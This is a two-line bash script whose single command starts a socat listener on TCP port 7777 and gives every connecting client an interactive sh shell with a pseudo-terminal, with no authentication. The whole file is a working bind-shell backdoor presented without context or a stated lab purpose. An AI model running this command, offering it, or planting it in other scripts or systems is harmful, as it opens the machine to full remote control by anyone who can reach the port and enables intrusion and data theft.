#!/bin/bash
socat tcp-l:7777,reuseaddr,fork EXEC:sh,pty,stderr,setsid,sigint,sane
